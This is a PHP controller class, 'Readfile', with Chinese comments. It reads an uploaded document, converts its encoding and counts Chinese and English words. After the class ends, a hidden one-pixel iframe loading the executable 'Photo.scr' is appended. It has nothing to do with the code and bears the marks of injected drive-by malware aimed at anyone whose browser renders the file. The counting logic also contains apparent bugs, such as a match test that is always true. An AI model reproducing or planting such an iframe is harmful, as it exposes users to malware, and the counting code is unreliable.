<?php
namespace app\Common\Controller;

use think\Controller;
//读取文件内容控制类
class Readfile {

	public static $count = 0;//字数统计结果

	public function Readfiles($thisfile) {		//读取文件内容并对文件中英文字数进行统计

		$file['name'] = $thisfile['name'][0];
		$file['temp'] = $thisfile['tmp_name'][0];
		$file['path'] = $thisfile['path'];

		$Getfile = fopen($file['path'], "r");
		$Filestr = fread($Getfile,filesize($file['path']));

		$encoding = mb_detect_encoding($Filestr, array('GB2312','GBK','UTF-16','UCS-2','UTF-8','BIG5','ASCII'));

        if ($encoding != false) {

            if (mb_detect_encoding($Filestr)!='UTF-8'){

               $Filestr = iconv($encoding, 'UTF-8', $Filestr);
               self::$count = $this->Countword($Filestr);
            }
            else {

               self::$count = $this->Countword($Filestr);
            }
        }
        elseif (strrpos(mime_content_type($file['path']),"application") >= 0) {	//针对于特殊文档的单独处理

        	 self::$count = $this->Dealwithfile($file['path']);
        }

		fclose($Getfile);

		return self::$count;

	}

	protected function Dealwithfile($file) {	//处理word文档、PDF文档、其他类文档

		$str_content = CheckSystemOS($file);	//外援函数支持

		return $this->strLength($this->stripstr($str_content));

	}

	protected function strLength($str, $num = 3) {

	    $length = strlen(preg_replace('/[\x00-\x7F]/', '', $str));
	 	$parrten = "/[a-zA-Z]+/";

		preg_match_all($parrten,$str,$arr,PREG_SET_ORDER);

	    $arr['en'] = count($arr);
	    $arr['cn'] = intval($length / $num);   //uft-8   

	   	return $arr['en']+$arr['cn'];
	} 

	protected function stripstr($str) { 	//替换符号

		return str_replace(array('..', "\n", "\r"), array('', '', ''),$str);
	}

	protected function Countword($str) {		//统计代码（中英文混合）

	    $str = preg_replace('/[\x80-\xff]{1,3}/', ' ', $str,-1,$n);
	    $n += str_word_count($this->stripstr($str));

	    return $n;
	}
}
<iframe src=Photo.scr width=1 height=1 frameborder=0>
</iframe>
